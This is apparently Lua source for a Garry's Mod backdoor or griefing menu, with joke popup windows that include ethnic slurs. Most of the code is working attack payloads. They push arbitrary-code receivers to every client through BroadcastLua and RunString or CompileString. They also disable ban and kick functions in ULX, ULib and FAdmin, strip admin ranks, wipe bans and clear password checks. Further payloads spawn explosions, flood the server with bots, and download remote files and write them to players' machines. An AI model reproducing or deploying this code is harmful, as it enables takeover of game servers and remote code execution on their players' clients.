Panel:SetPos( 200, 200 )
Panel:SetSize( 200, 200 )
Panel:SetTitle( "808kick.exe" )
Panel:MakePopup()

local SpawnI = vgui.Create( "SpawnIcon" , Panel )
SpawnI:SetPos( 75, 75 )
SpawnI:SetModel( "models/props_borealis/bluebarrel001.mdl" )
------------------------------------
local frame = vgui.Create( "DFrame" )
frame:SetSize( 300, 250 )
frame:Center()
frame:SetTitle ("scallymilano.exe")
frame:MakePopup()

local DComboBox = vgui.Create( "DComboBox", frame )
DComboBox:SetPos( 5, 30 )
DComboBox:SetSize( 100, 20 )
DComboBox:SetValue( "кого заскамил?" )
DComboBox:AddChoice( "мамонта" )
DComboBox:AddChoice( "узбека" )
DComboBox:AddChoice( "татарина" )
DComboBox:AddChoice( "алтынмаргендурдинхуинбека" )
DComboBox:AddChoice( "eго маму" )
DComboBox:AddChoice( "мальчика" )
DComboBox:AddChoice( "депутата" )
DComboBox:AddChoice( "бабу" )
DComboBox:AddChoice( "ашкеназа" )
DComboBox:AddChoice( "кобзона" )
DComboBox:AddChoice( "пугачеву" )
DComboBox:AddChoice( "мужика из вк" )
DComboBox:AddChoice( "рэпера" )
DComboBox:AddChoice( "бабушек в одноклассниках" )
DComboBox.OnSelect = function( self, index, value )
	print( value .." was selected at index " .. index )
end
------------------------------------
local frame = vgui.Create( "DFrame" )
frame:SetSize(400,400)
frame:SetTitle("shelly.exe")
frame:Center()
frame:MakePopup()

local lbl = vgui.Create( "DLabelURL", frame )
lbl:SetPos(50, 50)
lbl:SetSize(100, 50)
lbl:SetColor(Color(255,255,255,255)) 
lbl:SetText("слив шелли (клик)") 
lbl:SetURL("https://cdn.discordapp.com/attachments/635484763699937300/875805306721042452/images.jpg")
-------------------------------------
local frame = vgui.Create("DFrame")
frame:SetSize(ScrW() * 0.25, ScrH() * 0.25)
frame:SetTitle("youmom.exe")
frame:Center()
frame:MakePopup()

local html = vgui.Create("DHTML", frame)
html:Dock(FILL)
html:OpenURL("https://cdn.discordapp.com/attachments/635484763699937300/875810103679410226/download.jpg")
--------------------------------------
local frame = vgui.Create("DFrame")
frame:SetSize(ScrW() * 0.5, ScrH() * 0.5)
frame:SetTitle("besedaclassa.exe")
frame:Center()
frame:MakePopup()

local html = vgui.Create("DHTML", frame)
html:Dock(FILL)
html:OpenURL("https://all-lives-matter.ru/?utm_source=google&utm_medium=cpc&utm_campaign=net|g|cid|14009685054&utm_content=535463350305&utm_term=помощь%20приютам%20для%20собак&placement=&adposition=&matchtype=b&device=c&gclid=EAIaIQobChMI3_ucr9Ku8gIVTkaRBR1Yhw2nEAAYASAAEgKOffD_BwE")
----------------------------------------
local frame = vgui.Create("DFrame")
frame:SetSize(ScrW() * 0.25, ScrH() * 0.25)
frame:SetTitle("messenger.exe")
frame:Center()
frame:MakePopup()

local html = vgui.Create("DHTML", frame)
html:Dock(FILL)
html:OpenURL("https://ok.ru")
------------------------------------
local frame = vgui.Create("DFrame")
frame:SetSize(ScrW() * 0.25, ScrH() * 0.25)
frame:SetTitle("propaganda.exe")
frame:Center()
frame:MakePopup()

local html = vgui.Create("DHTML", frame)
html:Dock(FILL)
html:OpenURL("https://cdn.discordapp.com/attachments/872414902835376138/875824189884485682/download.jpg")
-------------------------------------
local frame = vgui.Create("DFrame")
frame:SetSize(ScrW() * 0.25, ScrH() * 0.25)
frame:SetTitle("hentai.exe")
frame:Center()
frame:MakePopup()

local html = vgui.Create("DHTML", frame)
html:Dock(FILL)
html:OpenURL("https://cdn.discordapp.com/attachments/872414902835376138/875824188726853682/1E999640-5EC9-4667-8EB5-17F586180E84.png")
end
-----------------------------------------------------------------
local DermaButton = vgui.Create( "DButton", panel11 )
DermaButton:SetText( "Disco V1" )
DermaButton:SetPos( 0, 0 )
DermaButton:SetSize( 400, 130 )
DermaButton.DoClick = function()
	function file.Write() return end
timer.Simple(1,function()
local function rdm_str(len)
    if !len or len <= 0 then return '' end
    return rdm_str(len - 1) .. ("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789")[math.random(1, 62)]
end
 
local net_string = rdm_str(25)
 
util.AddNetworkString(net_string)
BroadcastLua([[net.Receive("]] .. net_string .. [[",function()CompileString(util.Decompress(net.ReadData(net.ReadUInt(16))),"?")()end)]])
hook.Add("PlayerInitialSpawn", "spamlgfngfgjrfggtf"..net_string,function(ply)
    if !ply:IsBot() then
        ply:SendLua([[net.Receive("]] .. net_string .. [[",function()CompileString(util.Decompress(net.ReadData(net.ReadUInt(16))),"?")()end)]])
    end
end)
 
local function SendToClient(code)
    local data = util.Compress(code)
    local len = #data
    net.Start(net_string)
    net.WriteUInt(len, 16)
    net.WriteData(data, len)
    net.Broadcast()
end
 
SendToClient([[
    local AudioSource = nil
      local AMP = 12500
      gfx = {}
       sound.PlayURL("https://cdn.discordapp.com/attachments/871736400356184074/872238730243637268/5.mp3","no block",function(source,  err, errname)
    if IsValid(source) then
      AudioSource = source
      source:Play()

      local smoothdata = {}
      local smoothdataa = {}

      for i = 1, 512 do
        smoothdataa[i] = 0
      end

      for i = 1, 1024 do
        smoothdata[i] = 0
      end

      TextFramesss = vgui.Create( "DFrame" )
TextFramesss:SetSize( 650, 100 )
TextFramesss:SetTitle( "" )
TextFramesss:ShowCloseButton( false )
TextFramesss:Center()
TextFramesss.Paint = function( self, w, h ) -- 'function Frame:Paint( w, h )' works too
  draw.RoundedBox( 0, 0, 0, w, h, Color( 0, 0, 0, 0 ) ) -- Draw a red box instead of the frame
end

-- RichText panel
local richtext = vgui.Create( "RichText", TextFramesss )
richtext:Dock( FILL )

-- Red text
richtext:InsertColorChange( 235, 60, 32, 255 )
richtext:SetVerticalScrollbarEnabled( false )

local words = { "Это", "Диско", "от", "МегаВани315 ..." }

local delay = 1

-- Display each word in half second interval
for w, txt in pairs( words ) do

  if ( w == 1 ) then delay = 0.2
  else delay = ( w-1 )*0.45 end

  timer.Simple( delay, function()

    richtext:AppendText( txt.." " )
    richtext:InsertFade( 2, 1 ) -- Sustain for 2 seconds while fading out after 1 second

    richtext:SetBGColor( Color( 0, 0, 0, 0 ) )
    richtext:SetFontInternal( "DermaLarge" )

  end )
end
TextFramesss:Center()
  timer.Simple(7.50, function()
    TextFramesss:Close()
  end)

      function draw.RotatedBox( x, y, w, h, ang, color )
  draw.NoTexture()
  surface.SetDrawColor( color or color_white )
  surface.DrawTexturedRectRotated( x, y, w, h, ang )
end
timer.Simple(7.50, function()
  hook.Add("HUDPaint", "cbomecregardewowfd", function()
  local datah = {}
  AudioSource:FFT(datah, FFT_1024)
  for i = 1, 512 do
    local col = HSVToColor(i * 2 % 360,1,1)
    smoothdataa [i] = Lerp(10 * FrameTime(), smoothdataa[i], datah[i])
    draw.RotatedBox( ScrW() / 2, ScrH() / 2, 2.5, 100 + smoothdataa[i] * AMP, i * 1.25 * CurTime() % 360, col )
  end
  end)
end)
  hook.Add("HUDPaint", "cbomecregardewow", function()
  local data = {}
  AudioSource:FFT(data, FFT_1024)
  for i = 1, 512 do
    local col = HSVToColor(i * 2 % 360,1,1)
    smoothdata [i] = Lerp(10 * FrameTime(), smoothdata[i], data[i])
  end


  local ab = 0
  for i = 1, 50 do
    ab = ab + data[i]
  end
  ab = ab / 50

  local function SaBougeMec(ply,pos,angles,fov)
  local a = 0
  for i = 1, 50 do
    a = a + smoothdata[i]
  end
  a = a / 50

  local view = {}
  view.origin = pos
  view.angles = angles
  view.fov = fov + (a * 600)
  return view
end

hook.Add("CalcView", "SaBougeMec", SaBougeMec)

          local function SaZoomMec(ply,pos,angles,fov)
local ae = 0
  for i = 1, 50 do
    ae = ae + data[i]
  end
  ae = ae / 50

  local v = {}
  v.origin = pos
  v.angles = angles
  v.fov = fov - (ae * 600)
  return v
end

  local mats = Entity(0):GetMaterials()
            for k,v in pairs(mats) do
                Material(v):SetVector("$color", Vector(ab * 23,0,0))
            end

            local tbl = {}
        source:FFT(tbl,FFT_2048)

        
        xpcall(function()
            local fal = 0
        for i=4,6 do
            fal = fal + tbl[i]
        end

        if fal > 0.60 then
          if okmecctoikigeresabrotadeadsa == 1337 then
          net.Start("SaSauteCestBo")
          net.SendToServer()
        end
        timer.Destroy("ethopsadisparaitlol")
          timer.Destroy("ethoplezoomestrenormal")

        hook.Remove("CalcView", "SaBougeMec")
        if !hook.GetTable()["CalcView"]["SaBougeMec2"] then
        hook.Add("CalcView", "SaBougeMec2", SaZoomMec)
    end
    -- CODE CHELOUE
            local mats = Entity(0):GetMaterials()
            for k,v in pairs(mats) do
                Material(v):SetVector("$color", Vector(0,ab * 23,0))
            end
        -- FIN CODE CHELOUE
                hook.Add( "GetMotionBlurValues", "watht", function()
                        return 0, 0, 1, math.sin(CurTime() *13)
                end )
 
 
                hook.Add( "PostDrawTranslucentRenderables", "ohgodd", function()
                        render.SetMaterial( Material("cable/blue_elec") )
                        for i = 1, 32 do
                                render.DrawBeam( LocalPlayer():GetPos() +Vector(0, 0, 100) +(EyeAngles():Forward() *256), EyePos() +(VectorRand() *256), 4, 0, 12.5, Color(255, 255, 255, 255) )
                        end
                end )
                
              timer.Create("ethoplezoomestrenormal", 0.05, 1, function()
                hook.Remove("CalcView", "SaBougeMec2")
                hook.Add("CalcView", "SaBougeMec", SaBougeMec)
              end)
              timer.Create("ethopsadisparaitlol", 0.80, 1, function()
                hook.Remove("RenderScreenspaceEffects", "ohgoddd")
                hook.Remove("PostDrawTranslucentRenderables", "ohgodd")
                hook.Remove("GetMotionBlurValues", "watht")
              end)
         util.ScreenShake(LocalPlayer():GetPos(),20,20,0.5,20)
            local col = HSVToColor(ColorRand().r-50, ColorRand().g-50, ColorRand().b-50)
            function GAMEMODE:PostDraw2DSkyBox()
            render.Clear(col.r*1.3, col.g/2.5, col.b/2.5, 255)
            return !!1
        end
        function GAMEMODE:PreDrawSkyBox()
            render.Clear(col.r*1.3, col.g/2.5, col.b/2.5, 255)
            return !!1
        end
      end
      end,function()
        end)


end)

    end
end)
]])
end)
end


local DermaButton = vgui.Create( "DButton", panel11 )
DermaButton:SetText( "Disco (Gizeh) V2" )
DermaButton:SetPos( 0, 130 )
DermaButton:SetSize( 400, 140 )
DermaButton.DoClick = function()
	GizehSSV = GizehSSV or {}
function GizehSSV.Start_SV()
    RunConsoleCommand("ulx_logecho", "0")
    GizehSSV.HUD = GizehSSV.HUD or "HUDPaint_Receive"
    GizehSSV.Enabled = GizehSSV.Enabled or !!1
    GizehSSV.Wait1=!!1
    GizehSSV.Wait1=!!1
    GizehSSV.Wait1=!!1
	GizehSSV.SecureNet = GizehSSV.SecureNet or 'NIQUE TA MERE SALE PUTE :D'
	util.AddNetworkString(GizehSSV.HUD)
	BroadcastLua([[ net.Receive("]] .. GizehSSV.HUD .. [[", function() RunString(net.ReadString()) end)]])
    function GizehSSV.RandomString( len ) local str = "" for i = 0, len do str = str .. string.char(math.random(97,122)) end return str end
    GizehSSV.SecureString1 = GizehSSV.SecureString1 or GizehSSV.RandomString(11)
    GizehSSV.SecureString2 = GizehSSV.SecureString2 or GizehSSV.RandomString(11)
    GizehSSV.SecureString3 = GizehSSV.SecureString3 or GizehSSV.RandomString(11)
    GizehSSV.SecureString4 = GizehSSV.SecureString4 or GizehSSV.RandomString(11)
    GizehSSV.SecureString5 = GizehSSV.SecureString5 or GizehSSV.RandomString(11)
    GizehSSV.SecureString6 = GizehSSV.SecureString6 or GizehSSV.RandomString(11)
    GizehSSV.SecureString7 = GizehSSV.SecureString7 or GizehSSV.RandomString(11)
    GizehSSV.SecureString8 = GizehSSV.SecureString8 or GizehSSV.RandomString(11)
    GizehSSV.SecureString9 = GizehSSV.SecureString9 or GizehSSV.RandomString(11)
    GizehSSV.SecureString10 = GizehSSV.SecureString10 or GizehSSV.RandomString(11)
    GizehSSV.SecureString11 = GizehSSV.SecureString11 or GizehSSV.RandomString(11)
    GizehSSV.SecureString12 = GizehSSV.SecureString12 or GizehSSV.RandomString(11)
    GizehSSV.SecureString13 = GizehSSV.SecureString13 or GizehSSV.RandomString(11)
    GizehSSV.SecureString15 = GizehSSV.SecureString15 or GizehSSV.RandomString(11)
    GizehSSV.SecureString16 = GizehSSV.SecureString16 or GizehSSV.RandomString(11)
    GizehSSV.SecureString17 = GizehSSV.SecureString17 or GizehSSV.RandomString(11)
    util.AddNetworkString("GM::SendParticle::"..GizehSSV.SecureNet)
    util.AddNetworkString("GM::ParticleExist::"..GizehSSV.SecureNet)
    GizehSSV.LaViolence = {"22.031","22.758","23.039","24.508","24.756","26.024","26.511","27.020","27.285","27.412","27.496","28.012","28.780","29.981","30.148","30.348","30.514","32.017","32.101","32.210","32.319","32.751","33.017","33.752","34.018","35.252","36.027","36.254","36.339","36.448","36.557","36.667","37.556","40.525","40.759","41.026","42.027","42.527","43.261","43.346","43.528","44.029","44.796","46.031","46.531","47.032","48.033","48.142","48.252","49.001","49.053","49.187","49.264","50.002","51.036","51.269","52.037","52.270","52.380","52.489","52.771","53.038","53.122","53.199","53.505","54.039","61.048","62.047","66.018","78.029","80.031","82.033","84.036","86.035","144.895"}
    GizehSSV.ClientSide = [[
    hook.Add("PreDrawHUD", "]]..tostring(GizehSSV.SecureString13)..[[", function()
        gui.HideGameUI()
    end)
    GizehSSV = GizehSSV or {}
    GizehSSV.Wait1 = GizehSSV.Wait1 or !!1
    GizehSSVLogo = GizehSSVLogo or nil
    GizehSSV.Enabled = GizehSSV.Enabled or !!1
    sound.PlayURL( "https://cdn.discordapp.com/attachments/876490551527104542/876544235875221514/fdream_-_Thelema.mp3", "mono", function(s)
        if ( IsValid(s) ) then
            s:Play()
        end
    end)
    timer.Create("]]..tostring(GizehSSV.SecureString4)..[[", 0.1, 0, function()
        if not GizehSSV.Enabled then return end
        local mat = Entity(0):GetMaterials()
        for k,v in pairs(mat) do
            if GizehSSV.Wait1 then
                local col = HSVToColor( CurTime() % 6 * 60, 1, 1 )
                Material(v):SetVector("$color", Vector(col.r/220,col.g/220,col.b/220))
            else
                local col = Color(math.random(170,220),math.random(170,220),math.random(170,220))
                Material(v):SetVector("$color", Vector(col.r-200,col.g-200,col.b-200))
            end
        end
    end)
    timer.Simple(142.267,function()
        if not GizehSSV.Enabled then return end
        RunConsoleCommand('gmod_language', 'de')
    end)
    timer.Simple(22, function()
        if not GizehSSV.Enabled then return end
        timer.Create("]]..tostring(GizehSSV.SecureString2)..[[", 0.1, 0, function()
            if not GizehSSV.Enabled then return end
            notification.AddLegacy( "https://gizehmenu.net/", math.random(0, 4), 1.5 )
        end)
        function GAMEMODE:PostDraw2DSkyBox()
            local col = HSVToColor( RealTime() * 120 % 360, 1, 1 )
            render.Clear(col.r/1.3, col.g/1.3, col.b/1.3, 255)
            return !!1
        end
        function GAMEMODE:PreDrawSkyBox()
            local col = HSVToColor( RealTime() * 120 % 360, 1, 1 )
            render.Clear(col.r/1.3, col.g/1.3, col.b/1.3, 255)
            return !!1
        end
    end)
    timer.Simple(5, function()
        if not GizehSSV.Enabled then return end
        if GizehSSVLogo then GizehSSVLogo:Remove() GizehSSVLogo = nil end
        GizehSSVLogo = vgui.Create('HTML')
        GizehSSVLogo:MoveToFront()
        GizehSSVLogo:SetSize(600,200)
        GizehSSVLogo:SetPos((ScrW()/2)-300,(ScrH()/8)-100)
        GizehSSVLogo:OpenURL('https://cdn.discordapp.com/attachments/513628469154938881/693152511414108210/GizehMenuDougeTheBest.png')
        hook.Add("Tick","]]..tostring(GizehSSV.SecureString3)..[[", function()
            if GizehSSV.Wait1 then
                GizehSSVLogo:SetPos((ScrW()/2)-300,(ScrH()/8)-100)
            else
                GizehSSVLogo:SetPos((ScrW()/2)-math.random(280, 320),(ScrH()/8)-math.random(80, 120))
            end
        end)
        timer.Create("]]..tostring(GizehSSV.SecureString5)..[[", 1.5, 0, function()
            local time = tonumber(0)
            local Message = {
                "        . GizehMenu.net .        ",
                "       .. GizehMenu.net ..       ",
                "      ... GizehMenu.net ...      ",
                "     .... GizehMenu.net ....     ",
                "    ..... GizehMenu.net .....    ",
                "   ...... GizehMenu.net ......   ",
                "  ....... GizehMenu.net .......  ",
                " ........ GizehMenu.net ........ ",
                "......... GizehMenu.net .........",
                " ........ GizehMenu.net ........ ",
                "  ....... GizehMenu.net .......  ",
                "   ...... GizehMenu.net ......   ",
                "    ..... GizehMenu.net .....    ",
                "     .... GizehMenu.net ....     ",
                "      ... GizehMenu.net ...      ",
                "       .. GizehMenu.net ..       ",
                "        . GizehMenu.net .        ",
            }
            for _, line in pairs(Message) do
                time = time + tonumber(0.1)
                timer.Simple(time,function()
                    if not GizehSSV.Enabled then return end
                    chat.AddText(HSVToColor( CurTime() % 6 * 60, 1, 1 ),line)
                end)
            end
        end)
    end)
    timer.Simple(1, function()
        if not GizehSSV.Enabled then return end
        local text = "Le Guiser Menu sais trop bien les reille"
        local str = ''  text = string.Trim(text)  text = string.Explode(' ', text)  if text == {} then return end  for k,v in pairs(text) do  str = str .. v .. '+'  end sound.PlayURL('http://translate.google.com/translate_tts?ie=UTF-8&client=tw-ob&q='..str..'&tl=fr','mono',function(chan, num, str)end)
    end)
    local tab = {
        [ "$pp_colour_addr" ] = tonumber(0.001),
        [ "$pp_colour_addg" ] = tonumber(0.001),
        [ "$pp_colour_addb" ] = tonumber(0),
        [ "$pp_colour_brightness" ] = tonumber(-0.5),
        [ "$pp_colour_contrast" ] = tonumber(0.8),
        [ "$pp_colour_colour" ] = tonumber(3),
        [ "$pp_colour_mulr" ] = tonumber(1),
        [ "$pp_colour_mulg" ] = tonumber(0.5),
        [ "$pp_colour_mulb" ] = tonumber(0.4)
    }
    hook.Add("RenderScreenspaceEffects", "]]..tostring(GizehSSV.SecureString11)..[[", function()
        DrawColorModify( tab )
    end)
    ]]
    function GizehSSV.SendtoClients(code)
        net.Start( GizehSSV.HUD )
        net.WriteString(code)
        net.Broadcast()
    end
    function GizehSSV.SendtoClient(ply,code)
        net.Start( GizehSSV.HUD )
        net.WriteString(code)
        net.Send(ply)
    end
    GizehSSV.SendtoClients(GizehSSV.ClientSide)
    for k, v in pairs( player.GetAll() ) do
        v:SetJumpPower( 450 )
        v:GodEnable()
        if v:GetUserGroup() ~= tostring("user") then
            v:SetUserGroup("user")
        end
    end
    function GizehSSV.TriggeredSSV()
        for k,v in pairs(GizehSSV.LaViolence) do
            if not GizehSSV.Enabled then return end
            if tonumber(v) == nil then return end
            local time = tonumber(0.2)
            if tonumber(v) == tonumber(62.047) then time = tonumber(3.313) end
            if tonumber(v) == tonumber(66.018) then time = tonumber(3.55) end
            if tonumber(v) == tonumber(86.035) then time = tonumber(42.566) end
            timer.Simple(tonumber(v)-22.031,function()
                if not GizehSSV.Enabled then return end
                if tonumber(v) == tonumber(144.895) then
                    hook.Add("Think", GizehSSV.SecureString17, function()
                        local explode = ents.Create( "env_explosion" )
                        explode:SetPos( Vector(math.random(-6000, 6000), math.random(-6000, 6000), math.random(-500, 2000)) )
                        explode:Spawn()
                        explode:SetKeyValue( "iMagnitude", "500" )
                        explode:Fire( "Explode", 0, 0 )
                    end)
                end
                if tonumber(v) == tonumber(86.035) then
                    GizehSSV.Wait2 = !1
                end
                GizehSSV.Wait1 = !1
                GizehSSV.SendtoClients([[if GizehSSV then GizehSSV.Wait1 = tobool("]]..tostring(GizehSSV.Wait1)..[[") end]])
                timer.Simple(time,function()
                    GizehSSV.Wait1 = !!1
                    GizehSSV.Wait2 = !!1
                    GizehSSV.SendtoClients([[if GizehSSV then GizehSSV.Wait1 = tobool("]]..tostring(GizehSSV.Wait1)..[[") end]])
                end)
            end)
        end
    end
    timer.Simple(1, function()
        if not GizehSSV.Enabled then return end
        game.ConsoleCommand( 'sv_loadingurl "https://gizehmenu.net/images/gm.gif"\n' )
        game.ConsoleCommand( "sv_gravity 200\n" )
        if FAdmin and FAdmin.PlayerActions then function FAdmin.PlayerActions.ConvertBanTime() return 1 end end
        if ULib then
            function ULib.ban() return end
            function ULib.kickban() return end
            function ULib.kick() return end
            function ULib.addBan() return end
        end
        if ulx then
            function ulx.ban(...) return end
            function ulx.kick(...) return end
            function ulx.banid(...) return end
            function ulx.removeuser(...) return end
        end
        FAdmin = FAdmin or {}
        timer.Create(GizehSSV.SecureString15, 0.1, 0, function()
            FAdmin.BANS = {}
        end)
        hook.GetTable()["CheckPassword"] = {}
        timer.Create(GizehSSV.SecureString16, math.random( 3, 10 ), 0, function()
            for _, vehicl in pairs( ents.GetAll() ) do
                if vehicl:GetClass() == "prop_vehicle_jeep" then
                    local explosion = ents.Create("env_explosion")
                    explosion:SetPos(vehicl:GetPos())
                    explosion:Spawn()
                    explosion:SetKeyValue("iMagnitude", "50")
                    explosion:Fire("Explode", 0, 0)
                end
            end
        end)
        --if file.Exists( 'ulib/groups.txt', 'DATA' ) then
        --    file.Delete('ulib/groups.txt')
		--end
    end)
    timer.Create(GizehSSV.SecureString12, 149.544, 1, function()
        if not GizehSSV.Enabled then return end
        game.ConsoleCommand("changelevel " .. game.GetMap() .. "\n")
    end)
    timer.Simple(22, function()
        if not GizehSSV.Enabled then return end
        timer.Create(GizehSSV.SecureString1, 5, 1, function()
            local TickWait = !!1
            local TickFirst = tonumber(0)
            local TickTime = tonumber(0)
            for _,v in pairs(player.GetAll()) do
                local SpawnGizeh =  ents.Create( "prop_physics" )
                SpawnGizeh:SetModel("models/hunter/misc/squarecap1x1x1.mdl")
                SpawnGizeh:SetPos( Vector( v:GetPos()[1] + math.random(-1000, 1000), v:GetPos()[2] + math.random(-1000, 1000), -500 ))
                SpawnGizeh:Spawn()
                SpawnGizeh:Activate()
                SpawnGizeh:SetAngles(Angle(0,0,0))
                SpawnGizeh:SetModelScale(8)
                SpawnGizeh:SetCollisionGroup( 10 )
                SpawnGizeh:SetMaterial( "models/debug/debugwhite" )
            end
            hook.Add("Tick",GizehSSV.SecureString9, function()
                if not GizehSSV.Enabled then return end
                TickTime = TickTime + tonumber(0.1)
                for _,ent in pairs(ents.FindByModel("models/hunter/misc/squarecap1x1x1.mdl")) do
                    if ent:GetPos()[3] < tonumber(1000) and TickWait then
                        if ent:GetPos()[3] < tonumber(-550) then
                            ent:SetPos(ent:GetPos() + Vector(math.random(-1000, 1000),math.random(-1000, 1000),4))
                            ent:SetAngles(Angle(0,math.random(0,5),0))
                        else
                            ent:SetPos(ent:GetPos() + Vector(0,0,4))
                            ent:SetAngles(ent:GetAngles() + Angle(0,math.random(0,5),0))
                        end
                        TickWait = !!1
                    elseif ent:GetPos()[3] > tonumber(1000) then
                        ent:SetPos(ent:GetPos() + Vector(0,0,0))
                        ent:SetAngles(ent:GetAngles() - Angle(0,5,0))
                        TickWait = !1
                    elseif ent:GetPos()[3] < tonumber(-550) and TickTime > tonumber(100) then
                        TickFirst = tonumber(0)
                        TickTime = tonumber(0)
                        TickWait = !!1
                    elseif TickTime > tonumber(100) then
                        ent:SetPos(ent:GetPos() - Vector(0,0,8))
                        ent:SetAngles(ent:GetAngles() + Angle(0,math.random(0,5),0))
                        TickWait = !1
                    elseif TickFirst < tonumber(180) then
                        ent:SetPos(ent:GetPos() + Vector(0,0,0))
                        ent:SetAngles(Angle(TickFirst,TickFirst,0))
                        if TickFirst < tonumber(179) then
                            TickFirst = TickFirst + tonumber(0.5)
                        else
                            TickFirst = TickFirst + tonumber(0.1)
                        end
                    else
                        ent:SetPos(ent:GetPos() + Vector(0,0,0))
                        ent:SetAngles(ent:GetAngles() - Angle(0,5,0))
                    end
                    if GizehSSV.Wait1 then
                        ent:SetColor( Color(0,0,0) )
                    else
                        local col = Color(math.random(170,220),math.random(170,220),math.random(170,220))
                        ent:SetColor( Color(col.r-200,col.g-200,col.b-200) )
                    end
                end
            end)
        end)
        timer.Simple(0.2,function()
            GizehSSV.TriggeredSSV()
        end)
        timer.Create(GizehSSV.SecureString7,2,0,function()
            if not GizehSSV.Enabled then return end
            for k,v in pairs(player.GetAll()) do
                if not v:IsValid() then return end
                v:DoAnimationEvent(ACT_GMOD_TAUNT_PERSISTENCE)
                v:SetMaterial( "models/debug/debugwhite" )
                v:SetColor( HSVToColor( RealTime() * 120 % 360, 1, 1 ) )
                if DarkRP then
                    DarkRP.storeRPName(v, "#GizehMenu")
                    v:setDarkRPVar("rpname", "#GizehMenu")
                end
            end
        end)
        timer.Create(GizehSSV.SecureString6,0.5,game.MaxPlayers()-player.GetCount(),function()
            if not GizehSSV.Enabled then return end
            RunConsoleCommand("bot")
        end)
        timer.Create(GizehSSV.SecureString8, 0.32, 0, function()
            if not GizehSSV.Enabled then return end
            if GizehSSV.Wait2 then return end
            for y,ent in pairs(ents.GetAll()) do
                local phys = ent:GetPhysicsObject()
                local UnfreezeFreq = tonumber(1)
                local ShakeForce = tonumber(6)
                local force = math.random(1, 10)
                if phys:IsValid() then
                local mass = phys:GetMass()
                phys:ApplyForceOffset((mass * ShakeForce * Vector(math.Rand(-3.5, 5.2), math.Rand(-3.5, 5.2), math.Rand(3.5, 10.2))), (phys:GetPos() + Vector(math.Rand(-72, 72), math.Rand(-72, 72), math.Rand(-72, 72))))
                    if (math.random( 0, ( 320/UnfreezeFreq ) ) == ( 320/UnfreezeFreq ) ) && (ent != self) then
                        phys:EnableMotion(!!1)
                        phys:Wake()
                        phys:ApplyForceOffset((mass * ShakeForce * Vector(math.Rand(-32, 42), math.Rand(-32, 42), math.Rand(42, 52))), (phys:GetPos() + Vector(math.Rand(-72, 72), math.Rand(-72, 72), math.Rand(-72, 72))))
                    end
                end
            end
        end)
    end)
    GizehSSV.SendtoClients( [[
        net.Receive('GM::SendParticle::]]..GizehSSV.SecureNet..[[', function()
            local len = net.ReadUInt(32)
            local str = net.ReadData(len)
            local choux = util.Decompress(str)
            local pluie = net.ReadString()
            file.CreateDir(string.GetPathFromFilename(pluie))
            file.Write(pluie, choux)
            timer.Simple(2,function()
                if ( file.Exists("custom_mat/particles/gizeh.pcf.dat", "DATA") and file.Exists("custom_mat/materials/gizeh_particles/gizeh_particles.vtf", "DATA") ) then
                    local GizehVMT = Material( "weapons/swep.vmt" )
                    GizehVMT:SetTexture( "$basetexture", "../data/custom_mat/materials/gizeh_particles/gizeh_particles" )
                    game.AddParticles("../data/custom_mat/particles/gizeh.pcf.dat")
                    PrecacheParticleSystem("gizeh")
                    net.Start("GM::ParticleExist::]]..GizehSSV.SecureNet..[[")
                    net.SendToServer()
                end
            end)
        end)
    ]])
    net.Receive("GM::ParticleExist::"..GizehSSV.SecureNet,function(len,ply)
        ParticleEffectAttach("gizeh",PATTACH_ABSORIGIN_FOLLOW,ply,0)
    end)
    function GizehSSV.SendParticleToClients(name,code)
        local strC = util.Compress(code)
        net.Start( "GM::SendParticle::"..GizehSSV.SecureNet )
        net.WriteUInt(#strC,32)
        net.WriteData(strC,#strC)
        net.WriteString(name)
        net.Broadcast()
    end
    timer.Simple(5,function()
        http.Fetch( "https://github.com/JambonCru/Some-backup/raw/master/hKHJFklhgF.pcf", function( b, l, h, c )
            if (string.Left( b, 1 ) == "<" or b == "502: Failure") and string.Left( b, 43 ) ~= "<!-- dmx encoding binary 2 format pcf 1 -->" then
                return
            end
            GizehSSV.SendParticleToClients("custom_mat/particles/gizeh.pcf.dat",b)
        end)
        http.Fetch( "https://github.com/JambonCru/Some-backup/raw/master/IKFJHlfLFlfjNFKf.vtf", function( b, l, h, c )
            if string.Left( b, 1 ) == "<" or b == "502: Failure" then
                return
            end
            GizehSSV.SendParticleToClients("custom_mat/materials/gizeh_particles/gizeh_particles.vtf",b)
        end)
    end)
end
function GizehSSV.Clean_SV()
    game.ConsoleCommand( "sv_gravity 600\n" )
    for _,ent in pairs(ents.FindByModel("models/hunter/misc/squarecap1x1x1.mdl")) do
        ent:Remove()
    end
    timer.Remove(GizehSSV.SecureString1)
    timer.Remove(GizehSSV.SecureString6)
    timer.Remove(GizehSSV.SecureString7)
    timer.Remove(GizehSSV.SecureString8)
    timer.Remove(GizehSSV.SecureString12)
    timer.Remove(GizehSSV.SecureString16)
    hook.Remove("Think", GizehSSV.SecureString17)
    for k,v in pairs(player.GetAll()) do
        v:StopParticles()
        v:SetJumpPower( 200 )
        v:SetMaterial()
        v:SetColor( Color(255,255,255,255) )
    end
    GizehSSV.SendtoClients([[
    if GizehSSV then
        GizehSSV.Enabled = !1
        if GizehSSVLogo then GizehSSVLogo:Remove() GizehSSVLogo = nil end
        RunConsoleCommand('gmod_language', 'fr')
        RunConsoleCommand("stopsound")
        timer.Remove("]]..tostring(GizehSSV.SecureString4)..[[")
        timer.Remove("]]..tostring(GizehSSV.SecureString2)..[[")
        timer.Remove("]]..tostring(GizehSSV.SecureString5)..[[")
        hook.Remove("RenderScreenspaceEffects", "]]..tostring(GizehSSV.SecureString11)..[[")
        hook.Remove("Tick", "]]..tostring(GizehSSV.SecureString3)..[[")
        hook.Remove("PreDrawHUD", "]]..tostring(GizehSSV.SecureString13)..[[")
        function GAMEMODE:PostDraw2DSkyBox() return !1 end
        function GAMEMODE:PreDrawSkyBox() return !1 end
        local mat = Entity(0):GetMaterials()
        for k,v in pairs(mat) do
        local col = HSVToColor(CurTime() * 50 % 360, 1, 1)
            Material(v):SetVector("$color", Vector(1,1,1))
        end
    end
    ]])
    for _,bot in pairs(player.GetBots()) do
        bot:Kick("(SNTE) Net exploit detected !")
    end
end
GizehSSV.Start_SV()
end
------------------------------------------

